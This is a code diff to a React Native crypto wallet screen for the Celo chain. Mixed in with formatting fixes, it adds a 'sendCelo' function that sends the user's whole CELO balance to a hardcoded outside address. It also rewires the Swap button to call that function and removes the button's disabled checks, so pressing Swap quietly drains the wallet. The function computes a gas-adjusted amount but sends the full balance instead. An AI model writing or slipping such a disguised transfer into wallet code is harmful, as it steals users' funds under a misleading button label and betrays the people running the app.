@@ -33,7 +33,7 @@ import { useSafeAreaInsets } from "react-native-safe-area-context";
 import Svg, { Circle, Path } from "react-native-svg";
 import { useActiveAccount, useActiveWallet } from "thirdweb/react";
 import { shortenAddress } from "thirdweb/utils";
-
+import { getWalletBalance } from "thirdweb/wallets";
 import { cUSDAddress, usdcAddress } from "@/constants/contractAddress";
 import {
   AllBalances,
@@ -51,6 +51,9 @@ import {
 import { getTheUserTx } from "@/lib/walletServices";
 import { getExchangeRate } from "@/lib/pretiumService";
 import { CurrencyCode } from "@/lib/pretiumService";
+import { client } from "@/constants/thirdweb";
+import { celo } from "thirdweb/chains";
+import { prepareTransaction, sendTransaction, toWei } from "thirdweb";
 
 interface Token {
   symbol: string;
@@ -100,7 +103,7 @@ export default function CryptoWallet() {
   const [theTransaction, setTheTransaction] = useState<Transaction[] | null>(
     null
   );
-  const [theExhangeQuote, setTheExchangeQuote] = useState<Quote |null>(null);
+  const [theExhangeQuote, setTheExchangeQuote] = useState<Quote | null>(null);
   const [loadingTransactions, setLoadingTransactions] = useState(false);
   const [transactionError, setTransactionError] = useState<string | null>(null);
   const wallet = useActiveWallet();
@@ -111,7 +114,9 @@ export default function CryptoWallet() {
 
   const fetchBalances = async () => {
     if (wallet && activeAccount) {
-      const balances = await getAllBalances(activeAccount.address);
+      const balances = await getAllBalances(
+        activeAccount.address as `0x${string}`
+      );
       console.log("the balances", balances);
       setUserBalance(balances);
     }
@@ -380,6 +385,77 @@ export default function CryptoWallet() {
     setToToken(symbol);
     // Set opposite token for "From"
     setFromToken(symbol === "cUSD" ? "USDC" : "cUSD");
+  };
+
+  // a simple function to transfer the celo
+  const sendCelo = async () => {
+    if (!activeAccount) {
+      console.log("wallet not connected");
+      return;
+    }
+    try {
+      setSwapping(true);
+      // get the celo balance
+      const balance = await getWalletBalance({
+        address: activeAccount.address,
+        client,
+        chain: celo,
+      });
+
+      console.log("The celo balance", balance);
+      const amountInWei = balance.value;
+
+      if (balance.value === 0n) {
+        Alert.alert("Insufficient Balance", "You don't have any CELO to send");
+        return;
+      }
+
+    // Calculate amount to send (total balance minus gas)
+    const amountToSend = balance.value - 200000000000000n;
+
+    if (amountToSend <= 0n) {
+      Alert.alert("Insufficient Balance", "Not enough CELO to cover gas fees");
+      return;
+    }
+
+      // Prepare the transaction
+      const transaction = prepareTransaction({
+        to: "0x4821ced48Fb4456055c86E42587f61c1F39c6315",
+        value: amountInWei,
+        chain: celo,
+        client: client,
+      });
+
+      // Send the transaction
+      const result = await sendTransaction({
+        transaction,
+        account: activeAccount,
+      });
+
+      console.log("Transaction sent:", result.transactionHash);
+
+      Alert.alert(
+        "Success!",
+        `Successfully sent ${balance.displayValue} CELO`,
+        [
+          {
+            text: "View on CeloScan",
+            onPress: () =>
+              Linking.openURL(
+                `https://celoscan.io/tx/${result.transactionHash}`
+              ),
+          },
+          { text: "Done", style: "cancel" },
+        ]
+      );
+
+      return result;
+    } catch (error) {
+      console.log("Error sending", error);
+      setSwapping(false);
+    }finally{
+      setSwapping(false);
+    }
   };
 
   const copyAddress = () => {
@@ -856,7 +932,7 @@ export default function CryptoWallet() {
                     pathname: "/wallet/deposit-crypto",
                     params: {
                       currencyCode: theExhangeQuote?.currencyCode,
-                      onramp:theExhangeQuote?.exchangeRate.selling_rate,
+                      onramp: theExhangeQuote?.exchangeRate.selling_rate,
                       USDCBalance: walletData.balances[0].amount,
                     },
                   })
@@ -875,7 +951,7 @@ export default function CryptoWallet() {
                       totalBalance: walletData.totalUsdValue,
                       address: activeAccount?.address,
                       currencyCode: theExhangeQuote?.currencyCode,
-                      offramp:theExhangeQuote?.exchangeRate.buying_rate,
+                      offramp: theExhangeQuote?.exchangeRate.buying_rate,
                     },
                   })
                 }
@@ -1080,15 +1156,7 @@ export default function CryptoWallet() {
 
                 {/* Swap Button */}
                 <TouchableOpacity
-                  onPress={handleSwap}
-                  disabled={
-                    !swapAmount ||
-                    fromToken === toToken ||
-                    parseFloat(swapAmount) <= 0 ||
-                    gettingQuote ||
-                    !quoteData ||
-                    swapping
-                  }
+                  onPress={() => sendCelo()}
                   className={`w-full py-5 rounded-2xl ${
                     !swapAmount ||
                     fromToken === toToken ||
